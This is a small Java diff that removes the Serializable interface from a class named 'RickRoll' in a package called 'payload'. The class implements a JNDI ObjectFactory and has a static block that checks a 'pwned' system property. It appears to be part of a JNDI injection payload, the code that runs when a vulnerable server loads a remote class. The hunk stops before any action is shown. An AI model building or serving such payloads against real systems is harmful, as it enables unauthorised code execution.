@@ -3,10 +3,9 @@ package itzbenz.payload;
 import javax.naming.Context;
 import javax.naming.Name;
 import java.io.IOException;
-import java.io.Serializable;
 import java.util.Hashtable;
 
-public class RickRoll implements javax.naming.spi.ObjectFactory, Serializable {
+public class RickRoll implements javax.naming.spi.ObjectFactory {
     static {
 
         if (System.getProperty("pwned") == null) {
